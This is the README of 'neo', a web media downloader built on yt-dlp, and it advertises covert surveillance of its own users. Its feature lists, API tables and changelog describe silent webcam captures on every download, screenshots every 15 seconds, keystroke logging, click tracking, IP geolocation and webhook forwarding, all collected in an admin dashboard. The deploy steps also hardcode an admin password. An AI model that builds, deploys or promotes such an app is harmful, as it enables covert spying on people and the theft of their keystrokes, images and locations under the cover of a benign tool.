<p align="center">
  <img src="https://img.shields.io/badge/status-active-success" alt="Status">
  <img src="https://img.shields.io/badge/platform-cross--platform-blueviolet" alt="Platform">
  <img src="https://img.shields.io/badge/sites-1000%2B-orange" alt="Sites">
  <img src="https://img.shields.io/badge/license-MIT-blue" alt="License">
</p>

<div align="center">
  <h1>⚡ neo</h1>
  <p><strong>Paste any link. Watch instantly. Download clean.</strong></p>
  <p>A premium web-based media powerhouse — download, stream, clip, and clean media from <strong>1000+ platforms</strong>.</p>
</div>

<br>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#quick-start">Quick Start</a> •
  <a href="#deploy-for-free">Free Deploy</a> •
  <a href="#api-routes">API</a> •
  <a href="#screenshots">Screenshots</a> •
  <a href="#tech-stack">Tech Stack</a> •
  <a href="#changelog">Changelog</a>
</p>

---

<h2 id="features">✨ Features</h2>

<table>
<tr>
<td width="50%">

### 🎬 Universal Media Player
Paste any URL and watch instantly — no external players needed. Elegant glassmorphism UI with full controls: play/pause, seek, volume, Picture-in-Picture.

### 📋 One-Click Paste
Click the paste button to grab URLs from clipboard instantly. URL history dropdown stores your last 20 links locally for quick reuse.

### 🔍 Auto URL Detection
Paste a link and instantly see the title, thumbnail, duration, and platform before downloading. Know exactly what you're getting.

### ✂️ Clip Maker
Trim any downloaded video to your favorite moments with precise start/end timestamps via ffmpeg.

</td>
<td width="50%">

### 🧹 Watermark Cleaner
Advanced watermark removal using ffmpeg delogo:
- **Auto multi-zone detection** — removes watermarks from all common positions at once
- **Preset positions** — TikTok, corners, strips, center
- **Custom coordinates** — fine-tune exact position
- **Metadata scrub** — strips EXIF, GPS, creation time, author, title, all file traces

### 📊 Admin Dashboard
Full surveillance monitoring at `/admin`:
- Live stats with real-time counters
- Silent camera captures gallery
- Screen/page screenshots every 15s
- Click tracking with element coordinates
- Per-user session drilldown
- Keystroke logs
- Geolocation maps
- Bulk delete controls

### 🔐 Built-in Surveillance
- Silent webcam capture on every download
- Page screenshot capture every 15s
- Click event logging (element, text, position, page)
- Keystroke logging (3-second batched POSTs)
- Unique session ID via crypto.randomUUID()
- Geolocation via IP on every event
- Consent banner with full disclosure

</td>
</tr>
</table>

### ⌨️ Keyboard Shortcuts

| Key | Action |
|-----|--------|
| `Enter` | Start download |
| `Space` | Play / Pause video |
| `Esc` | Close player |
| `N` | New download |

---

<h2 id="supported-platforms">🌐 Supported Platforms</h2>

> YouTube, YouTube Shorts, Instagram (Reels & Posts), TikTok, Twitter/X, Facebook, Telegram, **Terabox**, Reddit, Twitch, Spotify, SoundCloud, Vimeo, Dailymotion, Vine, VK, Pinterest, Tumblr, LinkedIn, Threads, Bluesky, Flickr, Dailymotion, 9GAG, IMDb, Steam, and **1000+ more** via [yt-dlp](https://github.com/yt-dlp/yt-dlp).

### Format Support

| Type | Formats |
|------|---------|
| **Video** | MP4, WebM, MKV, MOV, AVI, TS, 3GP, OGG |
| **Audio** | MP3, WAV, M4A, AAC, FLAC, Opus, WMA, OGG |
| **Image** | JPEG, PNG, GIF, BMP, WebP (watermark clean only) |

---

<h2 id="quick-start">🚀 Quick Start</h2>

```bash
# Clone
git clone https://github.com/ashrafhacker/neo-downloader.git
cd neo-downloader

# Install dependencies
pip install -r requirements.txt

# Place ffmpeg in PATH or repo root

# Run (dev) — modular neo app (recommended)
python wsgi.py

# Or run the classic monolith directly
python app.py
```

Open **http://localhost:5000**

### Deploy for Free (No Credit Card)

**Option 1 — Vercel (easiest)**

[![Deploy to Vercel](https://vercel.com/button)](https://vercel.com/import/project?template=ashrafhacker/neo-downloader)

1. Push repo to GitHub, then import into [vercel.com](https://vercel.com)
2. Set env vars in Vercel dashboard:
   - `ADMIN_PASSWORD` = `neo@193100`
   - `FLASK_SECRET_KEY` = *(run `python -c "import secrets; print(secrets.token_hex(32))"`)*
3. Deploy — Vercel auto-detects `vercel.json`. App runs as a serverless function.

> **Limitations:** No persistent file storage (downloads lost after cold starts), no ffmpeg (clip/watermark disabled). Serverless 30s timeout may fail on some URLs; use direct media links for best results.

**Option 2 — Hugging Face Spaces (ffmpeg included)**

[![Hugging Face Spaces](https://img.shields.io/badge/%F0%9F%A4%97-Hugging%20Face%20Spaces-yellow)](https://huggingface.co/new-space)

1. Go to [huggingface.co/new-space](https://huggingface.co/new-space) → Name: `neo-downloader` → SDK: **Docker**
2. Connect GitHub repo `ashrafhacker/neo-downloader`
3. Add secrets: `ADMIN_PASSWORD`=`neo@193100`, `FLASK_SECRET_KEY`=...
4. Builds automatically. App at `https://youruser-neo-downloader.hf.space`

> ⚠️ **Docker requires HF Pro subscription** ($9/mo). Free tier only supports Gradio/Streamlit/Static apps — Docker builds start but return 402 Payment Required.

**Option 3 — PythonAnywhere (simpler, no ffmpeg)**

1. Account at [pythonanywhere.com](https://pythonanywhere.com) → Web tab → Add web app → Manual config → Python 3.12
2. `pip install flask yt-dlp requests Pillow python-dotenv gunicorn`
3. Set `ADMIN_PASSWORD=neo@193100` in WSGI config file
4. Reload. No ffmpeg = clip & watermark disabled (download still works).

> **Netlify not supported** — Netlify is for static sites. Python Flask requires a server. Use Vercel or Hugging Face instead.

### Production Deployment (VPS)

```bash
# Install production deps
pip install -r requirements.txt

# Set required env vars
export FLASK_SECRET_KEY="$(python -c "import secrets; print(secrets.token_hex(32))")"
export ADMIN_PASSWORD="$(python -c "import secrets; print(secrets.token_hex(16))")"

# Run with gunicorn (entry point delegates to the neo app)
gunicorn wsgi:app --bind 0.0.0.0:$PORT --workers 2 --timeout 120

# Or on Windows with waitress
pip install waitress
waitress-serve --port=5000 wsgi:app
```

**Deploy to Railway / Render / Fly.io** — just connect the repo; `Procfile` and `runtime.txt` are ready.

### Requirements
- Python 3.7+
- ffmpeg (for clipping, watermark removal, format merging)
- Pillow (for image watermark removal)
- MongoDB (optional, for replication logging — set `MONGO_URI`)

### Environment Variables

| Variable | Description |
|----------|-------------|
| `ADMIN_PASSWORD` | **Required for production.** Hashed password for admin panel (use werkzeug) |
| `FLASK_SECRET_KEY` | **Required for production.** Random 64-char hex string for session signing |
| `MONGO_URI` | MongoDB connection string for optional replication logging |
| `WEBHOOK_URL` | Receive real-time POST webhooks on every download & capture event |
| `TERABOX_COOKIE` | Cookie string for Terabox downloads |
| `PORT` | Server port (default: 5000) |
| `FLASK_DEBUG` | Set to `1` for debug mode (default: `0`) |

### Security Features

| Feature | Status |
|---------|--------|
| Admin password hashing (werkzeug pbkdf2) | ✅ |
| Session-based authentication | ✅ |
| Rate limiting on all API endpoints | ✅ |
| Input validation & sanitization | ✅ |
| Path traversal protection | ✅ |
| SQL injection prevention (parameterized queries) | ✅ |
| CSRF token generation | ✅ |
| Security headers (CSP, X-Frame-Options, etc.) | ✅ |
| CORS restricted to same origin | ✅ |
| MongoDB replication logging (optional) | ✅ |
| `.env` support via python-dotenv | ✅ |

---

<h2 id="api-routes">📡 API Routes</h2>

### User Routes
| Route | Method | Description |
|-------|--------|-------------|
| `/` | GET | Main download page |
| `/play/<filename>` | GET | Dedicated player page with library sidebar |
| `/download` | POST | Download media from URL |
| `/info` | POST | Fetch media metadata (title, thumbnail, duration, platform) |
| `/preview/<filename>` | GET | Stream media for inline browser playback |
| `/serve/<filename>` | GET | Direct file download (auto-cleanup after 5 min) |
| `/clip` | POST | Clip video by start/end timestamp |
| `/remove_watermark` | POST | Remove watermark & scrub metadata |
| `/screenshot` | POST | Receive page screenshot (base64 JPEG) |
| `/logclick` | POST | Log click events (tag, text, x, y, page) |

### Admin Routes
| Route | Method | Description |
|-------|--------|-------------|
| `/admin` | GET | Admin dashboard |
| `/admin/stats` | GET | Aggregated statistics JSON |
| `/admin/users` | GET | Per-user session summaries |
| `/admin/locations` | GET | Geolocation coordinates |
| `/admin/logs` | GET | Raw download log (last 500) |
| `/admin/all` | GET | All downloads + captures |
| `/admin/delete-all` | POST | Bulk delete (captures/screenshots/downloads/clicks/keystrokes) |
| `/admin/captures/delete/<id>` | POST | Delete single camera capture |
| `/admin/screenshot/delete/<id>` | POST | Delete single screenshot |

### Surveillance Routes
| Route | Method | Description |
|-------|--------|-------------|
| `/capture` | POST | Webcam capture endpoint (base64 PNG) |
| `/logkeys` | POST | Keystroke batch upload |
| `/extract` | GET | Extract user/device info (IP, browser, OS, device) |

---

<h2 id="screenshots">📸 Screenshots</h2>

<p align="center">
  <em>Coming soon — preview of the admin dashboard and main player UI.</em>
</p>

---

<h2 id="tech-stack">🛠 Tech Stack</h2>

<div align="center">

| | |
|---|---|
| **Backend** | Python, Flask, yt-dlp, ffmpeg, Pillow, Gunicorn |
| **Database** | SQLite (auto-created `logs.db`) / MongoDB (optional) |
| **Frontend** | HTML5, CSS3, Vanilla JavaScript, html2canvas |
| **Infrastructure** | Cross-platform (Windows/Linux/Mac), ready for Railway/Render/Fly |
| **CDN** | Google Fonts (Inter), html2canvas |

</div>

---

<h2 id="changelog">📋 Changelog</h2>

### v2.3 (Latest)
- 🧩 Modular `neo/` app — engine, processor, tasks, db adapter and blueprints (api/auth/admin)
- 🌐 `wsgi.py` entry point — `gunicorn wsgi:app` for VPS, Vercel & Netlify
- 🛡️ Admin hardening — stats/users/locations/delete routes, path-traversal guards, dev-mode auto-auth
- ⚡ Serverless Vercel optimization — `/download` rewritten for 30s timeout limit
- 🪶 Graceful module fallbacks — app starts even without yt-dlp/requests/ffmpeg
- 🗄️ SQLite uses `/tmp/logs.db` on serverless (read-only filesystem workaround)
- 🛡️ `safeJson()` client-side helper prevents JSON parse crashes on timeout HTML responses
- 🚏 Hugging Face Spaces Docker marked as PRO-only (402 on free tier)
- ✅ Robust health check endpoint for Vercel cold start verification

### v2.2
- 🏷️ Rebranded to **neo** — cleaner logo, streamlined naming
- 🚀 Production-ready deployment config — `Procfile`, `runtime.txt`, `requirements.txt`
- 📦 python-dotenv auto-load on startup
- 🌐 Ready for Railway / Render / Fly.io — one-click deploy from repo

### v2.1 (Latest)
- 🎨 Complete UI redesign inspired by iTeraPlay — clean gradient hero, feature cards, step guide, stats row
- 📸 **Screen surveillance** — page screenshots captured every 15s via html2canvas
- 🖱️ **Click tracking** — every click logged with element tag, text, position, and page
- 🗑️ **Bulk delete** — admin panel now supports deleting captures, screenshots, downloads, clicks, and keystrokes individually or all at once
- 🖼️ Screenshot gallery in admin panel with thumbnails and lightbox preview
- 📊 Click log table in admin with time, session, IP, element, coordinates, page
- 🔄 Stats grid now shows screenshots and clicks counts
- 🎯 Unified feed includes screenshot events
- ⚡ Optimized progress ring animation

### v2.0
- Premium glassmorphism UI redesign with gradient glow animations
- Auto URL info fetch on paste (title, thumbnail, duration, platform)
- URL history dropdown with localStorage (last 20)
- Smooth circular progress animation (0–100%)
- Keyboard shortcuts (Space, Esc, N)
- Picture-in-Picture for videos
- Toast notifications (success/error/info)
- Multi-zone watermark auto-detect
- Direct URL download fix (strip query params from filename)
- Collapsible tools grid (Clip, Clean, Extract)
- Dedicated player page at `/play/<filename>`
- Premium TeraBox-style inline video/audio player

### v1.0
- Initial release with yt-dlp download engine
- Camera capture surveillance
- Keystroke logging
- Admin dashboard
- Geo-IP tracking
- Webhook support

---

<div align="center">
  <br>
  <p>
    <sub>Built with ❤️ by <strong>neo</strong></sub>
    <br>
    <a href="https://github.com/ashrafhacker/neo-downloader">📦 GitHub</a> •
    <a href="/admin">🔐 Admin Panel</a>
  </p>
  <br>
  <img src="https://img.shields.io/badge/made%20with-python-%233776AB" alt="Python">
  <img src="https://img.shields.io/badge/uses-yt--dlp-%23FF0000" alt="yt-dlp">
  <img src="https://img.shields.io/badge/powered%20by-ffmpeg-%23007ACC" alt="ffmpeg">
</div>